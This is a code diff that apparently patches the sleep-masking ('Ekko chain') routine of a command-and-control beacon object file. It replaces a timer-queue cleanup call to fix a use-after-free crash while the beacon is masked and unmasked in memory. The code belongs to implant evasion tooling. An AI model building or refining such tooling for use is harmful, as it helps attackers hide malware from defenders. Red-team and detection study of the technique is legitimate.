@@ -63,7 +63,7 @@ DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE handle);
 // --- Timer queue APIs for self-masking (Ekko chain) ---
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlCreateTimerQueue(PHANDLE timerQueueHandle);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlCreateTimer(HANDLE timerQueueHandle, PHANDLE timerHandle, PVOID callback, PVOID context, DWORD dueTime, DWORD period, ULONG flags);
-DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlDeleteTimerQueue(HANDLE timerQueueHandle);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlDeleteTimerQueueEx(HANDLE timerQueueHandle, HANDLE completionEvent);
 
 // --- Context capture ---
 DECLSPEC_IMPORT VOID NTAPI NTDLL$RtlCaptureContext(PCONTEXT ContextRecord);
@@ -83,7 +83,7 @@ DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
 #define NtClose               NTDLL$NtClose
 #define RtlCreateTimerQueue   NTDLL$RtlCreateTimerQueue
 #define RtlCreateTimer        NTDLL$RtlCreateTimer
-#define RtlDeleteTimerQueue   NTDLL$RtlDeleteTimerQueue
+#define RtlDeleteTimerQueueEx NTDLL$RtlDeleteTimerQueueEx
 #define RtlCaptureContext     NTDLL$RtlCaptureContext
 #define LoadLibraryA          KERNEL32$LoadLibraryA
 #define GetProcAddress        KERNEL32$GetProcAddress
@@ -477,10 +477,14 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
             UnMaskBeacon(info);
         }
 
-        // [12] Clean up.
+        // [12] Clean up. RtlDeleteTimerQueueEx with INVALID_HANDLE_VALUE blocks
+        //      until all callbacks complete and the timer thread terminates.
+        //      Without this, the timer thread may still be returning through
+        //      NtTestAlert/timer dispatch when the queue structures are freed,
+        //      causing a use-after-free crash in TppTimerpExecuteCallback.
     LEAVE:
         if (hTimerQueue) {
-            RtlDeleteTimerQueue(hTimerQueue);
+            RtlDeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
         }
         if (hEvntTimer) {
             NtClose(hEvntTimer);
